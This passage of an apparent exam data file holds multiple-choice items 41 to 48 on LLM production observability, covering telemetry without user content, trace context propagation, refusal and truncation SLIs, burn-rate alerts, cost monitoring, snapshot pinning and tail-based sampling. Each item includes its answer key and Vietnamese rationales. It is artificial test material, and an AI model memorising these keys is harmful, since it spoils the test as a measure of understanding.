          "Quy định cấm nội dung, không cấm metadata (ý 2). Tắt hết là bỏ luôn phần vừa hợp lệ vừa cần thiết."
        ] }
    ],
    refs: [
      { label: "Docs API and data retention, mục “Zero data retention (ZDR)”: Anthropic không lưu prompt và response sau khi trả kết quả", href: "https://platform.claude.com/docs/en/manage-claude/api-and-data-retention" },
      { label: "Docs Claude Code Monitoring, mục “Common configuration variables”: <code>OTEL_LOG_USER_PROMPTS</code> mặc định tắt, nội dung prompt bị che", href: "https://code.claude.com/docs/en/monitoring-usage#common-configuration-variables" }
    ]
  },
  {
    de: 1, n: 41, total: 100, sub: "3.1", subName: "Telemetry và gắn đo đạc",
    answer: "AB",
    ask: "A retrieval-grounded assistant now and then gives answers that can't be traced back to any source. The team wants production telemetry that makes both grounding and prompt changes traceable, without logging any user content. Which two additions help most? (Choose two.)",
    scene: [
      "Trợ lý trả lời dựa trên tài liệu truy xuất (retrieval-grounded), thỉnh thoảng đưa ra câu trả lời không lần ra được nguồn nào.",
      "Team muốn gắn telemetry (dữ liệu đo đạc gửi về từ hệ thống đang chạy) để lần được hai thứ: câu trả lời dựa trên tài liệu nào, và prompt nào đang chạy.",
      "Chỗ khó: ràng buộc “without logging user content” (không ghi nội dung của người dùng). Phương án nào đòi lưu nguyên prompt hay câu trả lời là phạm luật ngay."
    ],
    asks: [
      "Hai bổ sung nào giúp nhiều nhất?",
      "Tức là: chọn tín hiệu bằng mã định danh (id, phiên bản), đủ để lần lại nguồn và lần lại thay đổi, mà không chứa chữ người dùng gõ.",
      "Soi từng phương án theo hai câu: có giúp lần nguồn hay lần thay đổi không, và có lưu nội dung người dùng không."
    ],
    facts: [
      "Grounding (bám nguồn): câu trả lời phải dựa trên tài liệu được đưa vào. Muốn kiểm thì phải biết lần đó truy xuất được đoạn nào, và câu trả lời trích đoạn nào. Tính năng Citations của Claude trả về đúng kiểu này: chỉ số tài liệu (<code>document_index</code>) và vị trí đoạn được trích, để mày kiểm nguồn của từng ý.",
      "Id tài liệu, id đoạn (chunk), điểm truy xuất là siêu dữ liệu (metadata), không phải chữ người dùng gõ. Ghi chúng không phạm ràng buộc riêng tư.",
      "Muốn biết một thay đổi hành vi đến từ đâu thì mỗi span (một đoạn việc trong trace) phải mang phiên bản prompt và model đang dùng. Có nhãn đó mới tách được số liệu trước và sau một lần đổi.",
      "Bài multi-agent research của Anthropic: họ theo dõi khuôn quyết định và cấu trúc tương tác của agent, không xem nội dung từng cuộc hội thoại, để giữ riêng tư cho người dùng."
    ],
    opts: [
      { k: "A", gist: "For each answer, log the IDs of the retrieved documents and chunks with their retrieval scores, plus which of them were actually cited in the response.",
        why: [
          "Đúng: biết lần đó lấy được đoạn nào, điểm bao nhiêu, đoạn nào được trích. Câu trả lời không trích đoạn nào là lộ ra ngay (ý 1).",
          "Toàn là mã định danh và con số, không chứa chữ người dùng (ý 2).",
          "Còn tách được hai ca: truy xuất trượt (không lấy được đoạn đúng), hay lấy được mà model không dùng."
        ] },
      { k: "B", gist: "Tag every span with the prompt version and the model identifier in use at the time.",
        why: [
          "Đúng: phần “prompt changes traceable” (lần được thay đổi prompt) cần đúng nhãn này (ý 3).",
          "Tỷ lệ câu không nguồn tăng sau một lần đổi prompt hay đổi model thì lọc theo nhãn là thấy. Nhãn cũng không chứa nội dung người dùng."
        ] },
      { k: "C", gist: "Record the sampling temperature and no other attribute of the request.",
        why: [
          "Sai: temperature (độ ngẫu nhiên khi sinh chữ) không nói được câu trả lời dựa trên tài liệu nào (ý 1).",
          "“No other attribute” (không thuộc tính nào khác) còn bỏ luôn phiên bản prompt và model, nên cũng không lần được thay đổi."
        ] },
      { k: "D", gist: "Keep the full prompts and completions of all users in the general analytics warehouse.",
        why: [
          "Sai ở ràng buộc: lưu nguyên prompt và câu trả lời là lưu nội dung người dùng, đề cấm thẳng.",
          "Còn tệ hơn vì đổ vào kho phân tích chung, ai có quyền đọc kho cũng đọc được.",
          "Dễ bị cuốn vì có đủ dữ liệu thì lần gì cũng được. Nhưng đề đã chốt không ghi nội dung, và id ở A đã đủ để lần nguồn."
        ] },
      { k: "E", gist: "Log errors only, on the grounds that successful traces don't help with grounding.",
        why: [
          "Sai ở giả định: câu trả lời không nguồn vẫn là request thành công, không có lỗi nào bắn ra.",
          "Chỉ ghi lỗi là bỏ đúng chỗ đang có vấn đề."
        ] }
    ],
    refs: [
      { label: "Docs Citations, mục “How citations work”: mỗi trích dẫn trỏ về tài liệu và vị trí đoạn được dùng, để kiểm nguồn từng ý", href: "https://platform.claude.com/docs/en/build-with-claude/citations#how-citations-work" },
      { label: "Bài “How we built our multi-agent research system”, mục “Production reliability and engineering challenges”: theo dõi quyết định của agent mà không đọc nội dung hội thoại", href: "https://www.anthropic.com/engineering/built-multi-agent-research-system" }
    ]
  },
  {
    de: 1, n: 42, total: 100, sub: "3.1", subName: "Telemetry và gắn đo đạc",
    answer: "C",
    ask: "In a multi-agent system, the traces for one user request show up as five separate, unrelated traces: one for the supervisor and one per worker. Engineers can't work out which worker call belonged to which request. What is the correct fix?",
    scene: [
      "Hệ nhiều agent: một supervisor (agent điều phối) giao việc cho bốn worker (agent làm việc).",
      "Một request của người dùng lại sinh ra năm trace rời nhau. Không ai biết lời gọi worker nào thuộc request nào.",
      "Chỗ khó: nhiều request chạy cùng lúc. Cách nối nào dựa vào đoán (theo giờ, theo tên) đều có thể nối nhầm."
    ],
    asks: [
      "Sửa thế nào cho đúng?",
      "Tức là: làm sao để mọi span của một request nằm chung một trace, có quan hệ cha con rõ ràng."
    ],
    facts: [
      "Distributed tracing (theo dấu phân tán): mỗi trace có một trace id. Khi gọi sang tiến trình hay agent khác, bên gọi phải chuyền trace context (trace id và span id cha) sang. Bên nhận tạo span con dưới span đó, nên mọi span nằm chung một trace.",
      "Chuẩn W3C Trace Context chuyền context qua <code>traceparent</code>. Claude Code làm đúng vậy: lệnh Bash nó chạy thừa hưởng biến <code>TRACEPARENT</code>. Trong Agent SDK, bên gọi đặt <code>TRACEPARENT</code> thì span <code>claude_code.interaction</code> thành con của span bên gọi.",
      "Docs Claude Code cũng ghi: khi Agent tool sinh subagent, các span gọi API và gọi tool của subagent nằm dưới span <code>claude_code.tool</code> của agent cha. Đó chính là hình supervisor → worker trong một trace."
    ],
    opts: [
      { k: "A", gist: "Put a timestamp on each worker's log lines and join them later by time window.",
        why: [
          "Sai: nối theo khung thời gian là đoán, không phải liên kết thật (ý 1).",
          "Nhiều request chạy song song thì các khung thời gian chồng nhau. Lời gọi worker của request này bị gán sang request khác.",
          "Dễ bị cuốn vì nghe rẻ, không phải sửa code agent. Nhưng chỗ đau đề kể là không biết lời gọi nào thuộc request nào, và nối theo giờ không trả lời chắc được."
        ] },
      { k: "B", gist: "Give each worker agent its own service name so the traces are easier to tell apart.",
        why: [
          "Sai: tên dịch vụ giúp phân biệt worker, không nối được span của worker với request (ý 1).",
          "Năm trace vẫn rời nhau, chỉ có thêm cái nhãn."
        ] },
      { k: "C", gist: "Pass the trace context from the supervisor into every worker so each worker's spans are created as children of the supervisor span, all inside one trace.",
        why: [
          "Đúng cơ chế của distributed tracing: chuyền context qua ranh giới agent, worker tạo span con (ý 1).",
          "Kết quả: một request là một trace, xem được cây supervisor → từng worker. Claude Code và Agent SDK làm đúng kiểu này với <code>TRACEPARENT</code> và span subagent lồng dưới span cha (ý 2, ý 3)."
        ] },
      { k: "D", gist: "Extend trace retention so all five traces are kept longer.",
        why: [
          "Sai: giữ lâu hơn không nối được trace nào với nhau.",
          "Năm trace rời vẫn rời, chỉ nằm trong kho lâu hơn."
        ] }
    ],
    refs: [
      { label: "Docs Claude Code Monitoring, mục “Span hierarchy”: span của subagent lồng dưới span tool của agent cha, và Agent SDK nhận TRACEPARENT từ bên gọi", href: "https://code.claude.com/docs/en/monitoring-usage#span-hierarchy" }
    ]
  },
  {
    de: 1, n: 43, total: 100, sub: "3.2", subName: "Giám sát và cảnh báo production",
    answer: "A",
    ask: "A team upgrades to a newer model. Its alerts, which watch only HTTP error rate and p95 latency, stay green. Two weeks on, customers report that answers get truncated or refused more often. Which monitoring change would have detected this soonest?",
    scene: [
      "Team nâng lên model mới. Cảnh báo chỉ canh hai thứ: tỷ lệ lỗi HTTP và độ trễ p95 (95% request nhanh hơn mức này).",
      "Cảnh báo xanh suốt. Hai tuần sau khách mới than: câu trả lời hay bị cụt giữa chừng hoặc bị từ chối.",
      "Chỗ khó: lỗi nằm trong nội dung của response thành công. Chỉ số hạ tầng nhìn không thấy."
    ],
    asks: [
      "Thay đổi giám sát nào bắt được chuyện này sớm nhất?",
      "Tức là: cần chỉ số đo chất lượng câu trả lời, tách theo phiên bản model và prompt, so với mốc trước khi đổi."
    ],
    facts: [
      "Bị cụt và bị từ chối đều có dấu hiệu sẵn trong response: <code>stop_reason</code> là <code>max_tokens</code> (chạm giới hạn <code>max_tokens</code> của request) hoặc <code>refusal</code> (Claude từ chối trả lời). Docs ghi rõ <code>refusal</code> trả về như một response HTTP 200 bình thường, không phải lỗi.",
      "Docs Claude Code Monitoring cũng nói refusal đến trên response thành công nên sự kiện <code>api_error</code> không bắn. Họ phải thêm hẳn sự kiện <code>api_refusal</code> để đếm riêng.",
      "SLI (service level indicator, chỉ số đo mức dịch vụ) không chỉ là lỗi và độ trễ. Với ứng dụng LLM, SLI chất lượng gồm tỷ lệ từ chối, tỷ lệ bị cắt, điểm của LLM judge (model chấm điểm) trên một mẫu câu trả lời.",
      "Muốn thấy trôi (drift) sau một lần đổi thì phải tách số theo phiên bản model, phiên bản prompt và so với baseline (mốc) trước khi đổi."
    ],
    opts: [
      { k: "A", gist: "Introduce quality SLIs (refusal rate, share of responses stopped by max_tokens, LLM-judge scores on a sample), split by model and prompt version and compared with the baseline from before the upgrade.",
        why: [
          "Đúng: hai triệu chứng khách than chính là <code>refusal</code> và <code>max_tokens</code>, đếm thẳng từ <code>stop_reason</code> (ý 1, ý 3).",
          "Tách theo phiên bản và so baseline thì ngày đầu đổi model đã thấy tỷ lệ nhảy, không phải chờ hai tuần (ý 4).",
          "Điểm judge bắt thêm các kiểu kém chất lượng không lộ qua <code>stop_reason</code>."
        ] },
      { k: "B", gist: "Post a status-page entry for every model release.",
        why: [
          "Sai: trang trạng thái là để thông báo, không đo gì cả.",
          "Ghi “đã đổi model” không cho biết câu trả lời có cụt hay bị từ chối nhiều hơn không."
        ] },
      { k: "C", gist: "Fire an alert on any change at all in the daily token count.",
        why: [
          "Sai: số token ngày nào cũng đổi, cảnh báo này kêu liên tục rồi bị bỏ qua.",
          "Cũng không chắc trúng bệnh. Câu bị từ chối thường ngắn đi, câu bị cụt thì dừng ở trần, tổng token có thể gần như không đổi."
        ] },
      { k: "D", gist: "Tighten the p95 latency threshold so smaller shifts trigger an alert.",
        why: [
          "Sai chỗ: độ trễ không phải triệu chứng. Response cụt hay bị từ chối vẫn có thể nhanh như cũ (ý 1).",
          "Dễ bị cuốn vì “nhạy hơn” nghe như “bắt sớm hơn”. Nhưng chỉ số không nhìn thấy lỗi thì chỉnh ngưỡng nhạy cỡ nào cũng không bắt được."
        ] }
    ],
    refs: [
      { label: "Docs Handling stop reasons, mục “Stop reasons versus errors”: max_tokens và refusal nằm trong response thành công, không phải lỗi HTTP", href: "https://platform.claude.com/docs/en/build-with-claude/handling-stop-reasons#stop-reasons-vs-errors" },
      { label: "Docs Claude Code Monitoring, mục “API refusal event”: refusal đến trên response thành công nên phải đếm riêng", href: "https://code.claude.com/docs/en/monitoring-usage#api-refusal-event" },
      { label: "Docs đánh giá, mục “Grade your evaluations”: chấm bằng LLM nhanh, mở rộng được, kiểm độ tin cậy trước rồi mới dùng rộng", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#grade-your-evaluations" }
    ]
  },
  {
    de: 1, n: 44, total: 100, sub: "3.2", subName: "Giám sát và cảnh báo production",
    answer: "D",
    ask: "An on-call engineer gets paged every time a short burst of 529 overloaded responses pushes the error rate above 2% for one minute, and nearly all of these bursts recover on their own. The team has a 99.5% monthly success SLO. What is the best alerting redesign?",
    scene: [
      "Cảnh báo hiện tại: tỷ lệ lỗi vượt 2% trong một phút là gọi người trực (page).",
      "Thủ phạm là những đợt 529 overloaded (API quá tải tạm thời) ngắn, gần như đợt nào cũng tự hết.",
      "Team có SLO (mục tiêu mức dịch vụ) 99,5% request thành công mỗi tháng.",
      "Chỗ khó: phải bớt ồn mà không bỏ sót sự cố thật. Tắt hay nâng ngưỡng bừa thì bớt ồn nhưng sót."
    ],
    asks: [
      "Thiết kế lại cảnh báo thế nào là tốt nhất?",
      "Tức là: gắn việc gọi người vào mức đe dọa SLO, không phải vào từng gợn lỗi ngắn."
    ],
    facts: [
      "Docs lỗi của Claude API: 529 <code>overloaded_error</code> là API đang quá tải tạm thời, có thể xảy ra khi lưu lượng chung của mọi người dùng tăng cao. SDK chính thức tự thử lại lỗi tạm thời với backoff (chờ tăng dần), mặc định hai lần.",
      "Error budget (ngân sách lỗi) = 100% trừ SLO. Với 99,5% mỗi tháng, được phép hỏng 0,5% số request trong tháng.",
      "Burn rate (tốc độ đốt ngân sách): lỗi đang tiêu ngân sách nhanh gấp bao nhiêu lần mức đều. Burn rate 1 là vừa hết ngân sách đúng cuối tháng.",
      "Cảnh báo burn rate nhiều cửa sổ: cửa sổ ngắn mà đốt nhanh thì gọi người ngay. Cửa sổ dài mà đốt chậm thì tạo ticket xử lý trong giờ làm. Gợn ngắn tự hết không đốt đủ ngân sách nên không gọi."
    ],
    opts: [
      { k: "A", gist: "Mute the alert during business hours, when traffic is at its peak.",
        why: [
          "Sai: giờ cao điểm là lúc sự cố thật gây hại nhiều nhất.",
          "Tắt theo giờ không phân biệt gợn ngắn với sự cố kéo dài. Ngoài giờ vẫn bị gọi vì gợn, trong giờ thì sót sự cố."
        ] },
      { k: "B", gist: "Raise the paging threshold to 50% so only complete outages page.",
        why: [
          "Sai: bớt ồn nhưng sót. Lỗi 10% là đốt ngân sách nhanh gấp 20 lần, lưu lượng đều thì khoảng một ngày rưỡi là hết ngân sách cả tháng, mà không ai bị gọi (ý 2, ý 3).",
          "Dễ bị cuốn vì nó giải quyết đúng cái phiền trước mắt là bị gọi vì gợn. Nhưng nó đổi ồn lấy mù: chỉ sập hẳn mới kêu."
        ] },
      { k: "C", gist: "Page on every single 529 so that nothing gets missed.",
        why: [
          "Sai hướng: đang ồn mà còn tăng ồn. 529 lẻ vốn là quá tải tạm thời và SDK đã tự thử lại (ý 1).",
          "Người trực bị gọi liên tục sẽ quen bỏ qua, tới lúc có sự cố thật lại phản ứng chậm."
        ] },
      { k: "D", gist: "Base alerts on how fast the error budget is burning, measured over multiple windows: page on a fast, severe burn and file a ticket for a slow one.",
        why: [
          "Đúng: gọi người theo mức đe dọa SLO (ý 2, ý 3).",
          "Gợn 529 một phút tự hết đốt rất ít ngân sách, không gọi. Lỗi vừa phải mà kéo dài thì cửa sổ dài bắt được, tạo ticket. Đốt nhanh và nặng thì gọi ngay (ý 4).",
          "Vừa bớt ồn vừa không sót, đúng hai điều đề cần."
        ] }
    ],
    refs: [
      { label: "Docs Claude API errors, mục “HTTP errors”: 529 overloaded_error là quá tải tạm thời, SDK tự thử lại với backoff", href: "https://platform.claude.com/docs/en/api/errors#http-errors" }
    ]
  },
  {
    de: 1, n: 45, total: 100, sub: "3.2", subName: "Giám sát và cảnh báo production",
    answer: "AE",
    ask: "Overnight, a batch of runaway agent loops caused an unexpected cost spike that was only discovered on the next invoice. Which two monitoring additions would detect this kind of problem fastest? (Choose two.)",
    scene: [
      "Một loạt agent rơi vào vòng lặp mất kiểm soát (runaway loop), chạy suốt đêm, chi phí tăng vọt.",
      "Không ai biết cho tới khi hóa đơn kỳ sau về.",
      "Chỗ khó: cần phát hiện nhanh, và đúng loại sự cố này. Một vòng lặp có thể gửi ít request nhưng mỗi request rất nhiều token."
    ],
    asks: [
      "Hai bổ sung giám sát nào phát hiện loại sự cố này nhanh nhất?",
      "Tức là: đo thẳng thứ tạo ra chi phí (token, số vòng gọi tool), đủ chi tiết để biết của ai, và kêu ngay khi lệch."
    ],
    facts: [
      "Chi phí tính theo token, không theo số request. Agent đốt token nhanh: bài multi-agent research của Anthropic ghi agent thường dùng khoảng 4 lần token so với chat, hệ nhiều agent khoảng 15 lần.",
      "Khi bật telemetry, Claude Code xuất metric <code>claude_code.cost.usage</code> và <code>claude_code.token.usage</code> sau mỗi request API, có thuộc tính <code>model</code> và tên agent. Agent SDK trả <code>total_cost_usd</code> (ước tính phía client) và chi phí theo từng model ở cuối mỗi lần chạy.",
      "Agent SDK có trần cho từng lần chạy: <code>max_turns</code> (số lượt tối đa) và <code>max_budget_usd</code> (ngưỡng chi phí ước tính). Chạm trần thì vòng lặp dừng với subtype <code>error_max_turns</code> hoặc <code>error_max_budget_usd</code>. Docs nói đặt budget là mặc định tốt cho agent production.",
      "Anomaly alert (cảnh báo bất thường) so với rolling baseline (mốc trượt theo thời gian gần đây): kêu khi số hiện tại lệch xa mức bình thường, không cần ngưỡng cố định."
    ],
    opts: [
      { k: "A", gist: "Publish token and cost metrics broken down by tenant, feature, and model, with anomaly alerts measured against a rolling baseline.",
        why: [
          "Đúng: đo đúng thứ tạo ra chi phí, theo phút chứ không theo tháng (ý 1, ý 2).",
          "Chia theo tenant, tính năng, model thì biết ngay ai đang đốt. Cảnh báo bất thường kêu khi chi phí lệch khỏi mức gần đây (ý 4)."
        ] },
      { k: "B", gist: "Alert solely on requests per minute.",
        why: [
          "Sai: chi phí đi theo token, không theo số request (ý 1).",
          "Một vòng lặp mà mỗi lượt lại nhồi thêm context có thể gửi ít request, nhưng request nào cũng rất nhiều token. Đếm request không thấy.",
          "Dễ bị cuốn vì vòng lặp nghe như “gọi liên tục”. Nhưng chữ “solely” (chỉ) làm nó hỏng: chỉ đếm lượt gọi là bỏ mất kích cỡ từng lượt."
        ] },
      { k: "C", gist: "Go through the monthly invoice more carefully each month.",
        why: [
          "Sai: hóa đơn về theo tháng, chính là cách team đang phát hiện quá muộn.",
          "Đọc kỹ hơn không làm hóa đơn về sớm hơn."
        ] },
      { k: "D", gist: "Watch average latency, because expensive loops always make responses faster.",
        why: [
          "Sai ở giả định: vòng lặp làm task chạy lâu hơn, không nhanh hơn.",
          "Độ trễ trung bình cũng là thước đo chi phí rất kém. Vài task lặp lẫn trong hàng nghìn request bình thường thì trung bình gần như không nhúc nhích."
        ] },
      { k: "E", gist: "Count tool-call iterations and tokens for each task, and raise an alert as soon as one task passes a set ceiling.",
        why: [
          "Đúng: bắt vòng lặp tại chỗ, ở mức từng task, trước khi chi phí kịp dồn lại.",
          "Cùng ý với <code>max_turns</code> và <code>max_budget_usd</code> của Agent SDK: đặt trần số lượt và chi phí cho mỗi lần chạy (ý 3).",
          "A thấy tổng đang lệch, E chỉ ra đúng task nào đang lặp. Hai cái bổ sung nhau."
        ] }
    ],
    refs: [
      { label: "Docs Agent SDK “How the agent loop works”, mục “Turns and budget”: max_turns và max_budget_usd đặt trần cho mỗi lần chạy", href: "https://code.claude.com/docs/en/agent-sdk/agent-loop#turns-and-budget" },
      { label: "Docs Agent SDK “Track cost and usage”, mục “Break down usage per model”: lấy token và chi phí theo từng model ở cuối mỗi lần chạy", href: "https://code.claude.com/docs/en/agent-sdk/cost-tracking#break-down-usage-per-model" },
      { label: "Docs Claude Code Monitoring, mục “Cost counter”: metric chi phí sau mỗi request, có thuộc tính model và tên agent", href: "https://code.claude.com/docs/en/monitoring-usage#cost-counter" }
    ]
  },
  {
    de: 1, n: 46, total: 100, sub: "3.2", subName: "Giám sát và cảnh báo production",
    answer: "B",
    ask: "A team calls a model through an alias, and the provider repointed that alias to a newer snapshot. Within a day, the refusal rate climbed from 0.5% to 3% and the answer style changed, although nothing in the team's own deployment had changed. Which practice would have made this both preventable and quick to diagnose?",
    scene: [
      "Team gọi model bằng alias (tên gọi tắt). Nhà cung cấp chuyển alias đó sang snapshot (bản model cố định) mới hơn.",
      "Trong một ngày: tỷ lệ từ chối từ 0,5% lên 3%, giọng trả lời cũng khác. Phía team không đổi gì.",
      "Chỗ khó: đề đòi hai thứ cùng lúc. “Preventable” (chặn được trước) và “quickly diagnosable” (chẩn đoán nhanh)."
    ],
    asks: [
      "Cách làm nào vừa chặn được chuyện này vừa giúp chẩn đoán nhanh?",
      "Tức là: không để model đổi ngầm, ghi lại model nào trả lời từng request, và nâng cấp có kiểm soát."
    ],
    facts: [
      "Alias có thể trỏ sang snapshot khác mà mày không đổi dòng code nào. Với Claude: các model trước thế hệ 4.6 có alias như <code>claude-sonnet-4-5</code>, trỏ về snapshot có ngày mới nhất của bản đó. Từ thế hệ 4.6, ID không ngày như <code>claude-sonnet-4-6</code> chính là snapshot cố định, không phải alias.",
      "Docs Model IDs cũng nói: trọng số cố định theo ID, nhưng hạ tầng phục vụ (router, bộ phân loại an toàn, logic sampling) có thể đổi, đôi khi gây khác biệt nhỏ. Nên ghi ID model trên từng response vẫn cần, kể cả khi đã ghim.",
      "Canary (thả thử): đưa thay đổi cho một phần nhỏ lưu lượng, so chỉ số với baseline. Lệch thì dừng trước khi tới mọi người dùng."
    ],
    opts: [
      { k: "A", gist: "Switch to another provider's model with every release to avoid dependency.",
        why: [
          "Sai: đổi nhà cung cấp mỗi lần phát hành là tự gây ra đúng loại thay đổi hành vi đang muốn tránh, còn thường xuyên hơn.",
          "Mỗi lần đổi lại phải chuyển đổi và kiểm lại từ đầu. Không chặn được, cũng không giúp chẩn đoán."
        ] },
      { k: "B", gist: "Pin a specific model snapshot, log which model identifier served each response, and ship upgrades through a canary that is compared with the baseline.",
        why: [
          "Đúng vế chặn: ghim snapshot thì model không đổi ngầm (ý 1). Đổi model thành quyết định của team.",
          "Đúng vế chẩn đoán: có ID model trên từng response thì tách được số liệu theo model, thấy ngay tỷ lệ từ chối nhảy theo snapshot mới (ý 2).",
          "Nâng cấp qua canary: tỷ lệ từ chối 3% lộ ra trên phần lưu lượng nhỏ trước, chưa tới mọi người dùng (ý 3)."
        ] },
      { k: "C", gist: "Add a system-prompt instruction telling the model to refuse less often.",
        why: [
          "Sai: vá triệu chứng, còn nguyên nhân là model bị đổi ngầm vẫn nằm đó. Có thể che luôn cả những lần từ chối đúng.",
          "Dễ bị cuốn vì sửa nhanh, không phải đụng hạ tầng. Nhưng đề hỏi cách vừa chặn được vừa chẩn đoán nhanh, một dòng prompt không làm được vế nào."
        ] },
      { k: "D", gist: "Turn off alerting on refusal rate, since it's expected to fluctuate.",
        why: [
          "Sai: tắt đúng tín hiệu đã phát hiện ra sự cố.",
          "Từ 0,5% lên 3% là gấp sáu lần, không phải dao động bình thường."
        ] }
    ],
    refs: [
      { label: "Docs Model IDs and versioning, mục “Dateless IDs are pinned snapshots”: ID không ngày từ thế hệ 4.6 là snapshot cố định, còn alias của model cũ trỏ về snapshot mới nhất", href: "https://platform.claude.com/docs/en/about-claude/models/model-ids-and-versions#dateless-ids-are-pinned-snapshots" },
      { label: "Docs Model IDs and versioning, mục “Model weights versus serving infrastructure”: hạ tầng đổi vẫn có thể làm hành vi khác chút ít trên cùng ID", href: "https://platform.claude.com/docs/en/about-claude/models/model-ids-and-versions#model-weights-versus-serving-infrastructure" }
    ]
  },
  {
    de: 1, n: 47, total: 100, sub: "3.3", subName: "Phân tích trace hàng loạt",
    answer: "D",
    ask: "A post-incident review discovers that rare tool timeouts hitting a single enterprise tenant never appeared in traces, since the platform keeps a flat 1% random sample. Which sampling approach better supports debugging at scale?",
    scene: [
      "Nền tảng giữ ngẫu nhiên đều 1% số trace (uniform sampling).",
      "Một tenant doanh nghiệp bị timeout tool hiếm gặp. Rà sự cố mới thấy không trace nào ghi lại được.",
      "Chỗ khó: lỗi hiếm gặp mẫu đều nhỏ thì gần như chắc chắn rơi mất. Nhưng giữ 100% trace thì quá tốn."
    ],
    asks: [
      "Chiến lược lấy mẫu nào giúp gỡ lỗi ở quy mô lớn tốt hơn?",
      "Tức là: giữ chắc các trace đáng soi (lỗi, bất thường), mà vẫn còn mẫu bình thường để so."
    ],
    facts: [
      "Head-based sampling (quyết định lúc bắt đầu): chọn giữ hay bỏ trước khi biết trace có gì. Lấy đều 1% là kiểu này, nên lỗi hiếm cũng bị bỏ đúng 99%.",
      "Tail-based sampling (quyết định lúc kết thúc): chờ trace xong mới chọn, nên giữ được mọi trace có lỗi, trễ cao, chi phí cao. Thêm một mẫu ngẫu nhiên nhỏ của trace bình thường để có baseline so sánh.",
      "Refusal không phải lỗi HTTP. Docs Claude Code Monitoring ghi refusal đến trên response thành công nên sự kiện <code>api_error</code> không bắn. Luật giữ trace phải nêu riêng refusal, không thì lọt."
    ],
    opts: [
      { k: "A", gist: "Keep only the traces users flagged with negative feedback, and leave current monitoring as it is.",
        why: [
          "Sai: phần lớn lỗi không ai bấm phản hồi. Timeout của tool nhiều khi người dùng chỉ thấy chậm rồi bỏ đi.",
          "Mất luôn trace bình thường để so sánh."
        ] },
      { k: "B", gist: "Bump the flat sample rate up to 5% and change nothing else.",
        why: [
          "Sai: vẫn là lấy mẫu đều, vẫn bỏ 95% lỗi hiếm (ý 1). Tốn gấp năm lần lưu trữ mà lỗi hiếm vẫn dễ rơi.",
          "Dễ bị cuốn vì “nhiều mẫu hơn” nghe như “thấy nhiều hơn”. Nhưng vấn đề nằm ở cách chọn, không nằm ở tỷ lệ."
        ] },
      { k: "C", gist: "Sample only traces from the largest tenants, because they matter most.",
        why: [
          "Sai: bỏ hẳn tenant nhỏ, lỗi xảy ra ở đó thì không bao giờ thấy.",
          "Chọn theo cỡ khách hàng chẳng liên quan gì tới việc trace có lỗi hay không. Phần còn lại cũng mất baseline."
        ] },
      { k: "D", gist: "Switch to tail-based sampling: always retain any trace with an error, a refusal, high latency, or high cost, and add a small random sample of normal traces as a baseline.",
        why: [
          "Đúng: chọn sau khi trace xong, nên mọi trace có timeout đều được giữ (ý 2). Liệt kê cả refusal, đúng thứ không lộ qua mã lỗi (ý 3).",
          "Mẫu ngẫu nhiên nhỏ của trace bình thường giữ baseline, để so trace lỗi khác trace khỏe ở đâu."
        ] }
    ],
    refs: [
      { label: "Docs Claude Code Monitoring, mục “API refusal event”: refusal đến trên response thành công, sự kiện lỗi không bắn", href: "https://code.claude.com/docs/en/monitoring-usage#api-refusal-event" },
      { label: "Bài “How we built our multi-agent research system”, mục “Production reliability and engineering challenges”: tracing production giúp tìm ra vì sao agent hỏng", href: "https://www.anthropic.com/engineering/built-multi-agent-research-system" }
    ]
  },
  {
    de: 1, n: 48, total: 100, sub: "3.3", subName: "Phân tích trace hàng loạt",
    answer: "C",
    ask: "An agent fails 4% of tasks overall. The team splits failures by dimension. By input length: under 20k tokens fails 1%, over 100k tokens fails 31%. By prompt version, tenant, and tool: every group falls between 3% and 5%. Inputs over 100k tokens are 8% of all tasks. What is the most reasonable conclusion and next step?",
    scene: [
      "Agent hỏng 4% task. Team chia lỗi theo nhiều chiều.",
      "Theo độ dài input: dưới 20k token hỏng 1%, trên 100k token hỏng 31%. Theo phiên bản prompt, tenant, tool: nhóm nào cũng 3–5%.",
      "Input trên 100k token chiếm 8% số task.",
      "Chỗ khó: phải tự tính nhóm input dài gánh bao nhiêu phần lỗi, không chỉ nhìn tỷ lệ hỏng của nhóm."
    ],
    asks: [
      "Kết luận nào hợp lý nhất, và bước tiếp theo là gì?",
      "Tức là: chiều nào thật sự tách ra được nhóm hỏng, và nên đào tiếp ở đâu."
    ],
    facts: [
      "Cohort analysis (phân tích theo nhóm): chia lỗi theo từng chiều, chiều nào có nhóm lệch hẳn so với nhóm khác thì đó là manh mối. Chiều nào nhóm nào cũng quanh mức chung thì chiều đó không giải thích được lỗi.",
      "Tính phần lỗi: nhóm dài là 8% task × 31% hỏng ≈ 2,5% tổng số task. Trên tổng 4% hỏng, đó là khoảng 62% số lỗi. Hơn nửa số lỗi đến từ 8% task.",
      "Bài context engineering của Anthropic: số token trong context càng tăng thì model nhớ lại thông tin càng kém (context rot, context mục dần). Độ chính xác khi truy thông tin và khi suy luận đường dài giảm dần.",
      "Replay (chạy lại) một mẫu task hỏng với đúng input cũ là cách xác nhận nguyên nhân trước khi sửa."
    ],
    opts: [
      { k: "A", gist: "The latest prompt version is at fault and should be reverted.",
        why: [
          "Sai: các phiên bản prompt đều 3–5%, quanh mức chung 4% (ý 1).",
          "Rollback không đụng gì tới nhóm input dài, nhóm đó vẫn hỏng 31%."
        ] },
      { k: "B", gist: "One tenant is at fault and should be throttled.",
        why: [
          "Sai: các tenant cũng đều 3–5%, không tenant nào lệch hẳn (ý 1).",
          "Bóp lưu lượng một tenant là phạt khách mà không sửa được gì."
        ] },
      { k: "C", gist: "The long-input group is the failing cohort and produces most of the failures, so inspect how context is built and managed for those tasks and replay a sample of them.",
        why: [
          "Đúng: độ dài input là chiều duy nhất tách hẳn (1% so với 31%), và nhóm đó gánh khoảng 62% số lỗi (ý 1, ý 2).",
          "Bước tiếp hợp lý: soi cách lắp và quản lý context cho task dài, vì context càng lớn model càng dễ sót thông tin (ý 3). Replay một mẫu để xác nhận trước khi sửa (ý 4)."
        ] },
      { k: "D", gist: "Failures are spread evenly, so they're random model noise that can't be improved.",
        why: [
          "Sai: số liệu cho thấy lỗi dồn rõ theo độ dài input, không hề đều.",
          "Dễ bị cuốn vì ba chiều prompt, tenant, tool đúng là đều. Nhưng chỉ cần một chiều lệch hẳn là đã có manh mối."
        ] }
    ],
    refs: [
      { label: "Bài “Effective context engineering for AI agents”, mục “Why context engineering is important to building capable agents”: context rot, token càng nhiều model nhớ lại càng kém", href: "https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents" },
